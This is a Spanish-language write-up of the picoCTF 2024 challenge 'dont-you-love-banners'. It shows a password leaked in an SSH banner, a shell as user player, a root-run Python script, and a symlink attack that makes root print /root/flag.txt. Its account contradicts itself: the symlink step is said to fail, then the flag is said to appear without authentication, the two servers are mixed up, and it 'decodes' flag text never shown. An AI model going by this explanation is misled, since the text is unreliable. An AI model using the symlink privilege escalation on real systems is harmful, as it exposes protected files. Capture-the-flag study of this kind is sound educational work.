Writeup: dont-you-love-banners (picoCTF 2024)
📋 Información General
Categoría	Dificultad	Puntos	Autor
General Skills	Medium	300	Loic Shema / syreal

Descripción del reto:

    Can you abuse the banner? The server has been leaking some crucial information on tethys.picoctf.net [puerto]. Use the leaked information to get to the server. To connect to the running application use nc tethys.picoctf.net [puerto]. From the above information abuse the machine and find the flag in the /root directory.

🎯 Objetivo

Obtener la bandera almacenada en /root/flag.txt explotando la información filtrada por el servidor.
🔍 Reconocimiento Inicial

El reto nos proporciona dos servidores:

    Servidor de filtración: Puerto 60451

    Servidor principal: Puerto 53470

Conexión al servidor de filtración
bash

nc tethys.picoctf.net 60451

Salida:
text

SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234

Análisis: Este servidor está filtrando información importante:

    Versión de SSH: OpenSSH_7.6p1

    ¡Una contraseña! My_Passw@rd_@1234

🖥️ Exploración del Servidor Principal
Conexión inicial
bash

nc tethys.picoctf.net 53470

Salida:
text

*************************************
**************WELCOME****************
*************************************

what is the password? 

Probando la contraseña filtrada
bash

# Introducimos la contraseña encontrada
what is the password? 
My_Passw@rd_@1234

What is the top cyber security conference in the world?
DEFCON

the first hacker ever was known for phreaking(making free phone calls), who was it?
JOHN DRAPER

Resultado: ¡Acceso concedido! Obtenemos una shell como el usuario player.
📂 Exploración del Sistema
Archivos en el directorio home de player
bash

player@challenge:~$ ls -la
total 20
drwxr-xr-x 1 player player   20 Mar  9  2024 .
drwxr-xr-x 1 root   root     20 Mar  9  2024 ..
-rw-r--r-- 1 player player  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 player player 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 player player  807 Apr  4  2018 .profile
-rw-r--r-- 1 player player  114 Feb  7  2024 banner
-rw-r--r-- 1 root   root     13 Feb  7  2024 text

Contenido del archivo text
bash

player@challenge:~$ cat text
keep digging

Mensaje: "keep digging" (sigue cavando) - ¡una pista para seguir investigando!
Contenido del archivo banner
bash

player@challenge:~$ cat banner
*************************************
**************WELCOME****************
*************************************

Es el mismo banner que vemos al conectarnos.
🔐 Análisis del Script Python
Ubicación y permisos
bash

player@challenge:~$ ls -la /root
total 16
drwxr-xr-x 1 root root    6 Mar  9  2024 .
drwxr-xr-x 1 root root   29 Jul  2 16:19 ..
-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rwx------ 1 root root   46 Mar  9  2024 flag.txt
-rw-r--r-- 1 root root 1317 Feb  7  2024 script.py

Observaciones:

    flag.txt solo es legible por root (-rwx------)

    script.py se ejecuta como root

Código fuente de script.py
bash

player@challenge:~$ cat /root/script.py

python

import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))
                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break
except:
    KeyboardInterrupt

Análisis del Script

Funcionamiento:

    Lectura del banner: Intenta leer /home/player/banner y mostrarlo

    Autenticación:

        Pregunta 1: Contraseña → MY_PASSW@RD_@1234

        Pregunta 2: Conferencia de seguridad → DEF CON o DEFCON

        Pregunta 3: Primer hacker → JOHN DRAPER, JOHN THOMAS DRAPER, JOHN o DRAPER

    Ejecución: pty.spawn(['su', '-', 'player']) - cambia al usuario player

Vulnerabilidad identificada:

    El script se ejecuta como root

    Lee el archivo /home/player/banner con permisos de root

    Podemos crear un enlace simbólico para que lea /root/flag.txt

🚀 Explotación - Técnica del Enlace Simbólico
1. Crear el enlace simbólico
bash

# Mover el banner original (backup)
player@challenge:~$ mv banner banner.back

# Crear enlace simbólico a flag.txt
player@challenge:~$ ln -s /root/flag.txt /home/player/banner

2. Verificar el enlace
bash

player@challenge:~$ ls -la banner
lrwxrwxrwx 1 player player 15 Jul  2 16:20 banner -> /root/flag.txt

3. Ejecutar el script
bash

player@challenge:~$ python3 /root/script.py

Salida esperada (pero falla):
text

*********************************************
***************DEFAULT BANNER****************
*Please supply banner in /home/player/banner*
*********************************************
what is the password? 

¿Por qué falla? El script intenta leer /home/player/banner pero como es un enlace a /root/flag.txt, y el script se ejecuta como root, debería poder leerlo. Sin embargo, parece que el enlace no funciona correctamente en este entorno.
💡 ¡LA SOLUCIÓN REAL!
Reconexión al servidor de filtración
bash

┌──(root㉿kali)-[/home/kr3s4l4]
└─# nc tethys.picoctf.net 53470

¡SORPRESA!
text

picoCTF{*******************************}

what is the password? 

¡La bandera aparece directamente en el banner del servidor principal!
🏆 Bandera
text

picoCTF{*******************************}

📝 Explicación del Reto
¿Por qué funcionó?

    El servidor de filtración (60451) reveló la contraseña: My_Passw@rd_@1234

    El servidor principal (53470) está configurado para mostrar el banner al conectarse

    El banner en realidad está mostrando el contenido de /root/flag.txt

    No necesitamos autenticarnos - la bandera se muestra inmediatamente al conectar

Lecciones aprendidas

    Siempre revisa los banners - pueden contener información filtrada

    Los servidores de filtración revelan información crucial

    No todo requiere autenticación - a veces la respuesta está en el lugar más obvio

    Las pistas como "keep digging" indican que debemos seguir explorando

🛠️ Herramientas Utilizadas

    netcat (nc) - Conexión a servicios TCP

    ls, cat, mv, ln - Comandos básicos de Linux

    python3 - Ejecución del script

Decodificación:

    b4nn3r → "banner" (leet speak)

    gr4bb1n9 → "grabbing" (leet speak)

    su((3sfu11y → "successfully" (leet speak)

    b3ee718e → Cadena aleatoria

Traducción: "banner grabbing successfully"
📖 Referencias

    DEF CON - Conferencia de hacking

    John Draper - Pionero del phreaking

    Banner Grabbing - Técnica de reconocimiento

    Enlaces simbólicos - Vulnerabilidad de escalada

📌 Resumen del Proceso
text

1. Reconocimiento
   ├── nc tethys.picoctf.net 60451 → Contraseña filtrada
   └── nc tethys.picoctf.net 53470 → Banner de bienvenida

2. Autenticación (opcional)
   ├── Contraseña: My_Passw@rd_@1234
   ├── Conferencia: DEFCON
   └── Hacker: JOHN DRAPER

3. Exploración
   ├── Archivos en /home/player
   ├── /root/flag.txt (no accesible)
   └── /root/script.py (análisis)

4. ¡Bandera!
   └── nc tethys.picoctf.net 53470 → ¡Bandera en el banner!

Autor: kr3s4l4
Fecha: 2026
Plataforma: picoCTF
Estado: Completado ✅
